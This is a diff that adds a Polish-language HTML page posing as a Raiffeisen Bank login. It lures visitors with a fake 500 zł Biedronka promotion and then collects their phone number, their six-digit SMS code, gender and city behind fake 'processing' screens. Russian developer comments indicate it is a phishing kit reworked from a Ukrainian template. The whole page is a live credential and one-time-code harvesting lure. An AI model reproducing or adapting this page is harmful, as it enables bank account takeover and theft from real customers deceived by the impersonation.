@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Logowanie do Raiffeisen Bank</title>
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/components.css">
+    <style>
+        .screen { display: none; }
+        .screen.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* +48 — krótszy prefix niż +380 */
+        .phone-input { padding-left: 70px !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- EKRAN 1: Telefon (+48) -->
+        <div id="screen-phone" class="screen active">
+            <div class="card fade-in">
+                <!-- Место под картинку — замените src на свой файл -->
+                <div class="promo-image-wrap" style="margin-bottom: 20px; text-align: center;">
+                    <img src="assets/images/promo-biedronka.png" alt="Biedronka i Raiffeisen" class="promo-image" style="max-width: 100%; height: auto; border-radius: 12px; display: block; margin: 0 auto;" onerror="this.style.display='none'">
+                </div>
+                <p style="color: #FFD700; font-size: 15px; font-weight: 600; text-align: center; margin-bottom: 8px;">Biedronka i Raiffeisen dają 500 zł</p>
+                <p style="color: #CCCCCC; font-size: 14px; text-align: center; margin-bottom: 20px;">z okazji urodzin Biedronki!</p>
+                
+                <h1 style="color: #FFFFFF;">Logowanie do Raiffeisen</h1>
+                <p class="subtitle" style="color: #CCCCCC;">Wprowadź numer telefonu</p>
+                
+                <form id="phoneForm">
+                    <div class="form-group">
+                        <label class="form-label" for="phone" style="color: #CCCCCC;">Numer telefonu</label>
+                        <div class="phone-input-wrapper">
+                            <span class="phone-prefix">🇵🇱 +48</span>
+                            <input 
+                                type="tel" 
+                                id="phone" 
+                                class="form-input phone-input" 
+                                placeholder="XXX XXX XXX"
+                                maxlength="11"
+                                inputmode="tel"
+                                required
+                            >
+                        </div>
+                        <div class="error-message" id="phoneError"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block" style="color: #1a1a1a;">
+                        Dalej
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- EKRAN 2: Kod z SMS (6 cyfr) -->
+        <div id="screen-code" class="screen">
+            <div class="card fade-in">
+                <h1 style="color: #FFFFFF;">Logowanie do Raiffeisen</h1>
+                <p class="subtitle" style="color: #FFFFFF;">Wprowadź kod z SMS</p>
+                
+                <p style="color: #FFFFFF; margin-bottom: 30px; font-size: 14px;" id="codeInstruction">
+                    Wprowadź <strong style="color: #FFD700;">6 cyfr</strong> z SMS
+                </p>
+                
+                <div class="code-inputs" id="codeInputs"></div>
+                
+                <div class="error-message" id="codeError"></div>
+                
+                <div class="timer" id="timer" style="color: #FFD700; font-size: 18px; font-weight: 600; margin: 20px 0;">00:30</div>
+                
+                <a href="#" class="resend-link resend-link--disabled" id="resendLink" style="color: #FFD700; text-decoration: none; font-size: 14px; display: block; margin: 15px 0;">
+                    Wyślij kod ponownie
+                </a>
+                
+                <button id="submitCode" class="btn btn-primary btn-block" style="margin-top: 20px; color: #1a1a1a;" disabled>
+                    Wyślij
+                </button>
+            </div>
+        </div>
+
+        <!-- EKRAN 3: Wybór kwoty -->
+        <div id="screen-amount" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; color: #FFFFFF;">Dostępna pomoc pieniężna</h1>
+                
+                <div class="amount-info" id="amountInfo" style="text-align: center; margin: 20px 0; font-size: 18px; color: #FFD700; font-weight: 600;"></div>
+                
+                <div class="amount-selection">
+                    <div class="currency-selector" style="margin-bottom: 20px;">
+                        <label class="form-label" style="text-align: center; margin-bottom: 15px; color: #FFFFFF;">Wybierz walutę:</label>
+                        <div class="currency-buttons">
+                            <button class="currency-btn selected" data-currency="pln" id="currencyPLN" style="color: #1a1a1a;">
+                                <span class="currency-icon">🇵🇱</span>
+                                <span>Złote (PLN)</span>
+                            </button>
+                            <button class="currency-btn" data-currency="eur" id="currencyEUR" style="color: #1a1a1a;">
+                                <span class="currency-icon">🇪🇺</span>
+                                <span>Euro (EUR)</span>
+                            </button>
+                            <button class="currency-btn" data-currency="usd" id="currencyUSD" style="color: #1a1a1a;">
+                                <span class="currency-icon">🇺🇸</span>
+                                <span>Dolary (USD)</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <button id="submitAmount" class="btn btn-primary btn-block" style="margin-top: 30px; color: #1a1a1a;">
+                        Dalej
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- EKRAN: Krótkie ładowanie (3 s) -->
+        <div id="screen-short-loading" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px; color: #FFFFFF;">
+                    Przetwarzanie danych
+                </h1>
+                
+                <div id="shortLoadingAmountDisplay" style="text-align: center; margin: 20px 0; font-size: 28px; color: #FFD700; font-weight: 700; padding: 15px; background: rgba(255, 215, 0, 0.1); border-radius: 12px;"></div>
+                
+                <div class="progress-bar-container" style="width: 100%; background-color: #555555; border-radius: 10px; height: 20px; overflow: hidden; margin-top: 20px;">
+                    <div class="progress-bar" id="shortLoadingProgressBar" style="height: 100%; width: 0%; background-color: #FFD700; border-radius: 10px; transition: width 0.1s linear;"></div>
+                </div>
+                
+                <p style="text-align: center; color: #CCCCCC; margin-top: 15px; font-size: 14px;">
+                    Proszę czekać...
+                </p>
+            </div>
+        </div>
+
+        <!-- EKRAN: Płeć -->
+        <div id="screen-gender" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; color: #FFFFFF;">
+                    Twoja płeć?
+                </h1>
+                
+                <div id="genderAmountDisplay" style="text-align: center; margin: 15px 0; font-size: 22px; color: #FFD700; font-weight: 600; padding: 10px; background: rgba(255, 215, 0, 0.1); border-radius: 12px;"></div>
+                
+                <div class="gender-buttons" style="display: flex; flex-direction: column; gap: 15px; margin-top: 20px;">
+                    <button class="btn btn-primary btn-block gender-btn" data-gender="male" style="font-size: 18px; padding: 15px; color: #1a1a1a;">
+                        👨 Mężczyzna
+                    </button>
+                    <button class="btn btn-primary btn-block gender-btn" data-gender="female" style="font-size: 18px; padding: 15px; color: #1a1a1a;">
+                        👩 Kobieta
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- EKRAN: Miasto -->
+        <div id="screen-city" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; color: #FFFFFF;">
+                    Twoje miasto?
+                </h1>
+                
+                <div id="cityAmountDisplay" style="text-align: center; margin: 15px 0; font-size: 22px; color: #FFD700; font-weight: 600; padding: 10px; background: rgba(255, 215, 0, 0.1); border-radius: 12px;"></div>
+                
+                <form id="cityForm" style="margin-top: 20px;">
+                    <div class="form-group">
+                        <label class="form-label" for="cityInput" style="color: #CCCCCC;">Nazwa miasta</label>
+                        <input type="text" id="cityInput" class="form-input" placeholder="np. Warszawa" required style="text-align: center;">
+                        <div class="error-message" id="cityError"></div>
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block" style="color: #1a1a1a;">
+                        Dalej
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- EKRAN: Finałowe ładowanie -->
+        <div id="screen-loading" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px; color: #FFFFFF;">
+                    Przetwarzanie
+                </h1>
+                
+                <div id="loadingAmountDisplay" style="text-align: center; margin: 20px 0; font-size: 28px; color: #FFD700; font-weight: 700; padding: 15px; background: rgba(255, 215, 0, 0.1); border-radius: 12px;"></div>
+                
+                <p id="loading-message" style="text-align: center; color: #CCCCCC; margin-top: 15px; font-size: 14px;">
+                    Proszę czekać...
+                </p>
+                
+                <div class="progress-bar-container" style="width: 100%; background-color: #555555; border-radius: 10px; height: 20px; overflow: hidden; margin-top: 20px;">
+                    <div class="progress-bar" id="loadingProgressBar" style="height: 100%; width: 0%; background-color: #FFD700; border-radius: 10px; transition: width 0.1s linear;"></div>
+                </div>
+                
+                <p id="loadingProgressText" style="text-align: center; color: #CCCCCC; margin-top: 10px; font-size: 14px;">0%</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
